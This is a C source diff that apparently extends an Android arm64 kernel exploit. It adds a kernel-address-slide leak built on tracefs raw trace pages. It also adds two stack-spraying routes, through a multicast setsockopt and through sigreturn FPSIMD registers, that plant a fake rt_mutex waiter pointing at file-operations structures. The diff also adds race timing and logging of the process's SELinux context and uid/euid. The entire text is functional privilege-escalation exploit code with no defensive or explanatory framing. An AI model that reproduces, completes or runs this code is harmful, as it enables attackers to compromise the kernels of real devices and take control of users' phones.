@@ -1,5 +1,13 @@
 #include "common.h"
 
+#include <netinet/in.h>
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
+#include <asm/sigcontext.h>
+#include <ucontext.h>
+#endif
+
 #ifndef SLIDE_MAX_ATTEMPTS
 #define SLIDE_MAX_ATTEMPTS 20
 #endif
@@ -55,6 +63,181 @@ int p0_virtual_base_probe;
 
 static int slide_commit_stext(uint64_t stext, const char *source);
 
+#if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
+#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
+
+static int slide_tracefs_write(const char *path, const char *value) {
+  int fd = open(path, O_WRONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  size_t len = strlen(value);
+  ssize_t wrote = write(fd, value, len);
+  close(fd);
+  return wrote == (ssize_t)len;
+}
+
+static int slide_tracefs_parse_page(
+    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
+  if (page_len < 20) {
+    return 0;
+  }
+  uint64_t commit = 0;
+  memcpy(&commit, page + 8, sizeof(commit));
+  size_t data_len = (size_t)(commit & 0xfffULL);
+  size_t end = 16 + data_len;
+  if (end > page_len) {
+    end = page_len;
+  }
+  for (size_t pos = 16; pos + 4 <= end;) {
+    uint32_t event_header = 0;
+    memcpy(&event_header, page + pos, sizeof(event_header));
+    uint32_t type_len = event_header & 0x1fU;
+    if (type_len == 30) {
+      pos += 8;
+      continue;
+    }
+    if (type_len == 31) {
+      pos += 12;
+      continue;
+    }
+    if (type_len == 0 || type_len >= 29) {
+      break;
+    }
+    size_t record_len = (size_t)type_len * 4;
+    size_t record = pos + 4;
+    if (record + record_len > end) {
+      break;
+    }
+    uint16_t event_id = 0;
+    memcpy(&event_id, page + record, sizeof(event_id));
+    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
+      uint64_t caller = 0;
+      memcpy(&caller, page + record + 16, sizeof(caller));
+      uint64_t link_caller =
+          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
+      if (caller >= link_caller) {
+        uint64_t candidate = caller - link_caller;
+        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+          pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
+                     (unsigned long long)caller,
+                     (unsigned long long)candidate);
+          *candidate_out = (uintptr_t)candidate;
+          return 1;
+        }
+      }
+    }
+    pos = record + record_len;
+  }
+  return 0;
+}
+
+static int slide_tracefs_trigger(void) {
+  char path[96];
+  snprintf(path, sizeof(path), "/data/local/tmp/.s23-trace-io-%d", getpid());
+  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
+  if (fd < 0) {
+    pr_error("slide tracefs trigger open failed errno=%d\n", errno);
+    return 0;
+  }
+  size_t chunk_size = 0x40000;
+  unsigned char *chunk = calloc(1, chunk_size);
+  if (!chunk) {
+    int saved_errno = errno;
+    close(fd);
+    unlink(path);
+    errno = saved_errno;
+    pr_error("slide tracefs trigger alloc failed errno=%d\n", errno);
+    return 0;
+  }
+  int ok = 1;
+  for (int round = 0; round < 16 && ok; round++) {
+    size_t done = 0;
+    while (done < chunk_size) {
+      ssize_t wrote = write(fd, chunk + done, chunk_size - done);
+      if (wrote < 0 && errno == EINTR) {
+        continue;
+      }
+      if (wrote <= 0) {
+        ok = 0;
+        break;
+      }
+      done += (size_t)wrote;
+    }
+  }
+  free(chunk);
+  if (ok && fsync(fd) != 0) {
+    ok = 0;
+  }
+  int saved_errno = errno;
+  close(fd);
+  unlink(path);
+  errno = saved_errno;
+  if (!ok) {
+    pr_error("slide tracefs trigger write failed errno=%d\n", errno);
+    return 0;
+  }
+  pr_info("slide tracefs trigger bytes=%u\n", 16U * 0x40000U);
+  return 1;
+}
+
+static int slide_tracefs_leak_kernel_base(void) {
+  static const char tracing_on[] =
+      SLIDE_TRACEFS_ROOT "/tracing_on";
+  static const char trace[] =
+      SLIDE_TRACEFS_ROOT "/trace";
+  static const char event_enable[] =
+      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
+  if (!slide_tracefs_write(tracing_on, "0")) {
+    pr_error("slide tracefs setup failed errno=%d\n", errno);
+    return 0;
+  }
+  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
+  if (trace_fd >= 0) {
+    close(trace_fd);
+  }
+  if (!slide_tracefs_write(event_enable, "1") ||
+      !slide_tracefs_write(tracing_on, "1")) {
+    pr_error("slide tracefs setup failed errno=%d\n", errno);
+    return 0;
+  }
+  if (!slide_tracefs_trigger()) {
+    slide_tracefs_write(tracing_on, "0");
+    slide_tracefs_write(event_enable, "0");
+    return 0;
+  }
+  sleep(1);
+  slide_tracefs_write(tracing_on, "0");
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  uintptr_t candidate = 0;
+  int found = 0;
+  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
+    char path[128];
+    snprintf(path, sizeof(path),
+             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+    if (fd < 0) {
+      continue;
+    }
+    unsigned char page[4096];
+    ssize_t got;
+    while ((got = read(fd, page, sizeof(page))) > 0) {
+      if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
+        found = 1;
+        break;
+      }
+    }
+    close(fd);
+  }
+  slide_tracefs_write(event_enable, "0");
+  if (!found) {
+    pr_error("slide tracefs worker caller not found\n");
+    return 0;
+  }
+  return slide_commit_stext(KIMAGE_TEXT_BASE + candidate, "tracefs");
+}
+#endif
+
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 static int slide_commit_virtual_base(uint64_t base, const char *source) {
   if ((base >> 48) != 0xffff || (base & 0x1fffffULL) != 0 ||
@@ -104,10 +287,20 @@ static void slide_log_child_context(void) {
   char enforce[32];
   read_first_line("/proc/self/attr/current", attr, sizeof(attr));
   read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
-  pr_success("slide child context route=pselect pid=%d uid=%u euid=%u "
+  const char *stack_writer = "pselect";
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_MCAST) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
+  stack_writer = "mcast";
+#elif defined(SLIDE_STACK_WRITER) && \
+      defined(SLIDE_STACK_WRITER_SIGRETURN) && \
+      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
+  stack_writer = "sigreturn";
+#endif
+  pr_success("slide child context stack_writer=%s pid=%d uid=%u euid=%u "
              "gid=%u egid=%u attr=%s enforce=%s\n",
-             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
-             enforce);
+             stack_writer, getpid(), getuid(), geteuid(), getgid(), getegid(),
+             attr, enforce);
 }
 
 int slide_pselect_words_per_set(void) {
@@ -314,6 +507,50 @@ void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
   }
 }
 
+static void slide_reset_consume_state(void) {
+  atomic_store(&slide_consume_stop, 0);
+  atomic_store(&slide_consume_go, 0);
+  atomic_store(&slide_consume_seen, 0);
+  atomic_store(&slide_consume_lost, 0);
+  atomic_store(&slide_consume_enter_sched, 0);
+  atomic_store(&slide_consume_calls, 0);
+  atomic_store(&slide_consume_sched_ok, 0);
+  atomic_store(&slide_consume_last_sched_ret, -1);
+  atomic_store(&slide_consume_last_sched_errno, 0);
+  atomic_store(&slide_pselect_write_window, 0);
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
+  atomic_store(&slide_pselect_started_ns, 0);
+#endif
+}
+
+#if defined(SLIDE_STACK_WRITER)
+static void slide_build_fake_waiter(unsigned char *payload,
+                                    size_t waiter_off) {
+  uintptr_t tree_parent = slide_oracle_parent;
+  uintptr_t tree_right = 0;
+  uintptr_t tree_left = slide_oracle_target;
+  uintptr_t pi_parent = slide_oracle_parent;
+  uintptr_t pi_right = 0;
+  uintptr_t pi_left = slide_oracle_target;
+
+#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION && \
+    defined(APP_PRODUCTION_STACK_PI_RIGHT_ONLY) && \
+    APP_PRODUCTION_STACK_PI_RIGHT_ONLY
+  if (slide_oracle_parent == fake_fops &&
+      slide_oracle_target == data_addr(ASHMEM_MISC_FOPS)) {
+    pi_right = slide_oracle_target;
+    pi_left = 0;
+  }
+#endif
+
+  memset(payload + waiter_off, 0, FAKE_WAITER_LAYOUT_SIZE);
+  put_fake_waiter(payload, waiter_off,
+                  tree_parent, tree_right, tree_left,
+                  pi_parent, pi_right, pi_left,
+                  fake_task, fake_lock, FAKE_WAITER_PRIO);
+}
+#endif
+
 void slide_pselect_stack_copy(void) {
   if (!page_base || !fake_lock || !fake_w0) {
     pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
@@ -346,19 +583,7 @@ void slide_pselect_stack_copy(void) {
   prepare_slide_pselect_fdsets(&in, &out, &ex);
   open_slide_selected_fds(&in, &out, &ex, high_read);
 
-  atomic_store(&slide_consume_stop, 0);
-  atomic_store(&slide_consume_go, 0);
-  atomic_store(&slide_consume_seen, 0);
-  atomic_store(&slide_consume_lost, 0);
-  atomic_store(&slide_consume_enter_sched, 0);
-  atomic_store(&slide_consume_calls, 0);
-  atomic_store(&slide_consume_sched_ok, 0);
-  atomic_store(&slide_consume_last_sched_ret, -1);
-  atomic_store(&slide_consume_last_sched_errno, 0);
-  atomic_store(&slide_pselect_write_window, 0);
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-  atomic_store(&slide_pselect_started_ns, 0);
-#endif
+  slide_reset_consume_state();
 
   struct timespec timeout = {
 #ifdef SLIDE_PSELECT_TIMEOUT_NSEC
@@ -437,6 +662,227 @@ void slide_pselect_stack_copy(void) {
   close(pipefd[0]);
   close(pipefd[1]);
 }
+
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_MCAST) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
+static void slide_mcast_stack_copy(void) {
+  enum { stamp_size = 0x108 };
+  _Static_assert(MCAST_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= stamp_size,
+                 "MCAST waiter must fit in the copied stack stamp");
+  unsigned char stamp[stamp_size];
+  memset(stamp, 0, sizeof(stamp));
+  uint16_t invalid_family = AF_UNSPEC;
+  memcpy(stamp + 0x08, &invalid_family, sizeof(invalid_family));
+  slide_build_fake_waiter(stamp, MCAST_WAITER_OFF);
+
+  int fd = socket(AF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+  if (fd < 0) {
+    pr_error("slide mcast socket errno=%d\n", errno);
+    return;
+  }
+
+  slide_reset_consume_state();
+
+  errno = 0;
+  int ret = setsockopt(fd, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP,
+                       stamp, sizeof(stamp));
+  int saved_errno = errno;
+  atomic_store(&slide_consume_go, 1);
+  while (!atomic_load(&slide_consume_stop))
+    __asm__ volatile("yield" ::: "memory");
+  atomic_store(&slide_consume_go, 0);
+
+  int sched_ok = atomic_load(&slide_consume_sched_ok);
+  atomic_store(&slide_pselect_write_window,
+               ret == -1 && saved_errno == EADDRNOTAVAIL && sched_ok > 0);
+  pr_info("slide mcast returned offset=%#x ret=%d errno=%d "
+          "calls=%d sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
+          MCAST_WAITER_OFF, ret, saved_errno,
+          atomic_load(&slide_consume_calls), sched_ok,
+          atomic_load(&slide_consume_last_sched_ret),
+          atomic_load(&slide_consume_last_sched_errno));
+  close(fd);
+}
+#endif
+
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_SIGRETURN) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
+static atomic_int slide_sigreturn_done;
+static atomic_int slide_sigreturn_status;
+static atomic_int slide_sigreturn_found_fpsimd;
+static atomic_int slide_sigreturn_found_sve;
+static atomic_int slide_sigreturn_waiter_off;
+static unsigned char slide_sigreturn_payload_fpsimd[0x200];
+static unsigned char slide_sigreturn_payload_sve[0x200];
+
+_Static_assert(ATOMIC_INT_LOCK_FREE == 2,
+               "signal handler atomics must be lock-free");
+_Static_assert(sizeof(struct fpsimd_context) == 0x210,
+               "unexpected arm64 FPSIMD context size");
+_Static_assert(sizeof(((struct fpsimd_context *)0)->vregs) == 0x200,
+               "unexpected arm64 FPSIMD register payload size");
+_Static_assert(SIGRETURN_SVE_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= 0x200,
+               "fake waiter must fit in FPSIMD registers");
+
+static void slide_sigreturn_handler(int signal_number,
+                                    siginfo_t *signal_info,
+                                    void *user_context) {
+  (void)signal_number;
+  (void)signal_info;
+  ucontext_t *context = user_context;
+  unsigned char *cursor = context->uc_mcontext.__reserved;
+  unsigned char *end = cursor + sizeof(context->uc_mcontext.__reserved);
+  struct fpsimd_context *fpsimd = NULL;
+  int saw_sve = 0;
+  int status = -3;
+
+  atomic_store_explicit(&slide_sigreturn_found_fpsimd, 0,
+                        memory_order_relaxed);
+  atomic_store_explicit(&slide_sigreturn_found_sve, 0,
+                        memory_order_relaxed);
+  atomic_store_explicit(&slide_sigreturn_waiter_off, -1,
+                        memory_order_relaxed);
+
+  while ((size_t)(end - cursor) >= sizeof(struct _aarch64_ctx)) {
+    struct _aarch64_ctx *header = (struct _aarch64_ctx *)cursor;
+    if (header->magic == 0 && header->size == 0) {
+      break;
+    }
+    if (header->size < sizeof(*header) || (header->size & 15) != 0 ||
+        (size_t)(end - cursor) < header->size) {
+      status = -2;
+      goto done;
+    }
+    if (header->magic == FPSIMD_MAGIC) {
+      if (header->size < sizeof(struct fpsimd_context)) {
+        status = -4;
+        goto done;
+      }
+      fpsimd = (struct fpsimd_context *)header;
+    } else if (header->magic == SVE_MAGIC) {
+      saw_sve = 1;
+    }
+    cursor += header->size;
+  }
+
+  if (fpsimd == NULL) {
+    goto done;
+  }
+
+  size_t waiter_off = saw_sve ? SIGRETURN_SVE_WAITER_OFF
+                              : SIGRETURN_FPSIMD_WAITER_OFF;
+  if (waiter_off + FAKE_WAITER_LAYOUT_SIZE >
+      sizeof(fpsimd->vregs)) {
+    status = -5;
+    goto done;
+  }
+
+  atomic_store_explicit(&slide_sigreturn_found_fpsimd, 1,
+                        memory_order_relaxed);
+  atomic_store_explicit(&slide_sigreturn_found_sve, saw_sve,
+                        memory_order_relaxed);
+  atomic_store_explicit(&slide_sigreturn_waiter_off, (int)waiter_off,
+                        memory_order_relaxed);
+
+  volatile unsigned char *destination =
+      (volatile unsigned char *)fpsimd->vregs;
+  const unsigned char *source = saw_sve ? slide_sigreturn_payload_sve
+                                        : slide_sigreturn_payload_fpsimd;
+  for (size_t index = 0;
+       index < sizeof(slide_sigreturn_payload_fpsimd); index++) {
+    destination[index] = source[index];
+  }
+  status = 1;
+
+done:
+  atomic_store_explicit(&slide_sigreturn_status, status,
+                        memory_order_relaxed);
+  atomic_store_explicit(&slide_sigreturn_done, 1, memory_order_release);
+}
+
+static void slide_sigreturn_stack_copy(void) {
+  memset(slide_sigreturn_payload_fpsimd, 0,
+         sizeof(slide_sigreturn_payload_fpsimd));
+  memset(slide_sigreturn_payload_sve, 0,
+         sizeof(slide_sigreturn_payload_sve));
+  slide_build_fake_waiter(slide_sigreturn_payload_fpsimd,
+                          SIGRETURN_FPSIMD_WAITER_OFF);
+  slide_build_fake_waiter(slide_sigreturn_payload_sve,
+                          SIGRETURN_SVE_WAITER_OFF);
+
+  struct sigaction action;
+  struct sigaction old_action;
+  memset(&action, 0, sizeof(action));
+  action.sa_sigaction = slide_sigreturn_handler;
+  action.sa_flags = SA_SIGINFO | SA_RESTART;
+  if (sigemptyset(&action.sa_mask) != 0) {
+    pr_error("slide sigreturn sigemptyset errno=%d\n", errno);
+    return;
+  }
+  if (sigaction(SIGUSR2, &action, &old_action) != 0) {
+    pr_error("slide sigreturn sigaction install errno=%d\n", errno);
+    return;
+  }
+
+  slide_reset_consume_state();
+  atomic_store_explicit(&slide_sigreturn_done, 0, memory_order_relaxed);
+  atomic_store_explicit(&slide_sigreturn_status, 0, memory_order_relaxed);
+  atomic_store_explicit(&slide_sigreturn_found_fpsimd, 0,
+                        memory_order_relaxed);
+  atomic_store_explicit(&slide_sigreturn_found_sve, 0,
+                        memory_order_relaxed);
+  atomic_store_explicit(&slide_sigreturn_waiter_off, -1,
+                        memory_order_relaxed);
+
+  int tid = (int)syscall(SYS_gettid);
+  errno = 0;
+  siginfo_t signal_info;
+  memset(&signal_info, 0, sizeof(signal_info));
+  signal_info.si_signo = SIGUSR2;
+  signal_info.si_code = SI_QUEUE;
+  signal_info.si_pid = getpid();
+  signal_info.si_uid = getuid();
+  int ret = (int)syscall(SYS_rt_tgsigqueueinfo, getpid(), tid,
+                         SIGUSR2, &signal_info);
+  int saved_errno = errno;
+  int handler_done = atomic_load_explicit(&slide_sigreturn_done,
+                                          memory_order_acquire);
+  int handler_status = atomic_load_explicit(&slide_sigreturn_status,
+                                            memory_order_relaxed);
+
+  if (ret == 0 && handler_done && handler_status == 1) {
+    atomic_store(&slide_consume_go, 1);
+    while (!atomic_load(&slide_consume_stop)) {
+      __asm__ volatile("yield" ::: "memory");
+    }
+    atomic_store(&slide_consume_go, 0);
+  }
+
+  int sched_ok = atomic_load(&slide_consume_sched_ok);
+  atomic_store(&slide_pselect_write_window,
+               ret == 0 && handler_done && handler_status == 1 &&
+               sched_ok > 0);
+  pr_info("slide sigreturn returned offset=%#x ret=%d errno=%d "
+          "handler_done=%d status=%d fpsimd=%d sve=%d calls=%d "
+          "sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
+          atomic_load_explicit(&slide_sigreturn_waiter_off,
+                               memory_order_relaxed),
+          ret, saved_errno, handler_done, handler_status,
+          atomic_load_explicit(&slide_sigreturn_found_fpsimd,
+                               memory_order_relaxed),
+          atomic_load_explicit(&slide_sigreturn_found_sve,
+                               memory_order_relaxed),
+          atomic_load(&slide_consume_calls), sched_ok,
+          atomic_load(&slide_consume_last_sched_ret),
+          atomic_load(&slide_consume_last_sched_errno));
+
+  if (sigaction(SIGUSR2, &old_action, NULL) != 0) {
+    pr_error("slide sigreturn sigaction restore errno=%d\n", errno);
+  }
+}
+#endif
 
 #if defined(SLIDE_SYNC_PSELECT_SYSCALL) && SLIDE_SYNC_PSELECT_SYSCALL
 static long slide_read_task_syscall_nr(int tid) {
@@ -649,6 +1095,9 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
 }
 
 void *slide_waiter_thread(void *arg __attribute__((unused))) {
+#ifdef SLIDE_WAITER_CORE
+  pin_to_core(SLIDE_WAITER_CORE);
+#endif
   int tid = (int)SYSCHK(syscall(SYS_gettid));
   atomic_store(&slide_waiter_tid, tid);
 
@@ -693,7 +1142,19 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
     __asm__ volatile("yield" ::: "memory");
   }
 
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_MCAST) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
+  slide_mcast_stack_copy();
+#elif defined(SLIDE_STACK_WRITER) && \
+      defined(SLIDE_STACK_WRITER_SIGRETURN) && \
+      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
+  slide_sigreturn_stack_copy();
+#elif defined(SLIDE_STACK_WRITER)
+#error Unsupported SLIDE_STACK_WRITER value
+#else
   slide_pselect_stack_copy();
+#endif
   atomic_store(&slide_route_done, 1);
 
   for (;;) {
@@ -1028,9 +1489,14 @@ int app_trigger_fops_slide_route(void) {
     70000, 60000, 80000, 40000, 90000, 50000,
     30000, 20000, 75000, 65000, 85000, 55000,
   };
+#if defined(APP_CLOSED_FOPS_ROUTE) && APP_CLOSED_FOPS_ROUTE
+  slide_oracle_parent = fake_fops;
+  slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
+#else
   if (!select_slide_payload_index(0)) {
     return 0;
   }
+#endif
   int delay = 0;
 #if defined(APP_FOPS_ROUTE_USE_PSELECT_DELAY) && APP_FOPS_ROUTE_USE_PSELECT_DELAY
   const char *forced = getenv("PSELECT_DELAY_USEC");
@@ -1462,6 +1928,8 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
   return 1;
 }
 
+
+
 int slide_leak_kernel_base(void) {
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
@@ -1512,7 +1980,11 @@ int slide_leak_kernel_base(void) {
     return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
 #endif
   }
+#if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
+  return slide_tracefs_leak_kernel_base();
+#else
   return slide_leak_physical_base();
+#endif
 #else
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
   uintptr_t forced_offset = 0;
